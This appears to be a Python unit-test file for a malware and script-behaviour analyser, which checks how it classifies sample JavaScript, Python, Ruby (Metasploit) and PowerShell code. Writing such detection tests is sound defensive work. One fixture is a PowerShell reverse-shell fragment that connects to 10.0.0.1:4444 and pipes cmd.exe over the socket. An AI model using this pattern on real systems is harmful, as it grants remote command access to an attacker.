import unittest

from app.modules.deep_analysis.semantic import analyze_semantic
from app.modules.deep_analysis.behavior import interpret_behavior


class TestUniversalSemantic(unittest.TestCase):
    def test_javascript_fetch_utility(self):
        js = '''
const axios = require('axios');
async function fetchUser(id) {
  return axios.get('https://api.example.com/users/' + id);
}
module.exports = { fetchUser };
'''
        r = analyze_semantic(None, filename='client.js', sample_text=js)
        caps = {c['id'] for c in r['capabilities']}
        self.assertIn('network_http', caps)
        self.assertNotIn('subprocess_exec', caps)
        self.assertGreaterEqual(r['confidence_score'], 24)

    def test_powershell_reverse_shell_pattern(self):
        ps = '''
$s = New-Object Net.Sockets.TCPClient('10.0.0.1',4444);
$stream = $s.GetStream();
Start-Process cmd.exe -RedirectStandardInput $stream
'''
        r = analyze_semantic(None, filename='rev.ps1', sample_text=ps)
        self.assertEqual(r.get('purpose_rule_id'), 'reverse_shell')
        self.assertEqual(r['behavior_class'], 'remote_access')

    def test_generic_python_always_gets_semantic_behavior(self):
        code = '''
def greet(name):
    return f"Hello {name}"
print(greet("world"))
'''
        bundle = {
            'combined_verdict': 'clean',
            'filename': 'hello.py',
            'semantic': analyze_semantic(None, filename='hello.py', sample_text=code),
            'deep_exclusive': {'script': {'language': 'python', 'http_calls': []}},
        }
        b = interpret_behavior(bundle, sample_text=code)
        self.assertEqual(b['interpretation_source'], 'semantic_capability')
        self.assertNotEqual(b['behavior_class'], 'unknown_script')
        self.assertTrue(b.get('summary'))

    def test_ruby_metasploit_structure(self):
        rb = '''
require 'msf/core'
class MetasploitModule < Msf::Auxiliary
  def run
  end
end
'''
        r = analyze_semantic(None, filename='aux.rb', sample_text=rb)
        self.assertEqual(r['purpose_rule_id'], 'metasploit_module')


if __name__ == '__main__':
    unittest.main()
